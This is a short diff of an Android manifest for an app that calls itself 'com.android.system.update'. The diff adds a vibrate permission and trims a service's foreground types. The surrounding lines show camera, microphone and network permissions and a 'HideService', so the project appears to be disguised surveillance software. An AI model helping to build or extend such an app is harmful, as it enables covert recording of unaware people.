@@ -3,6 +3,7 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.android.system.update">
     <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
@@ -58,7 +59,7 @@
             android:name=".services.MainService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="dataSync|camera|microphone|location" />
+            android:foregroundServiceType="dataSync" />
         <service
             android:name=".services.HideService"
             android:enabled="true"
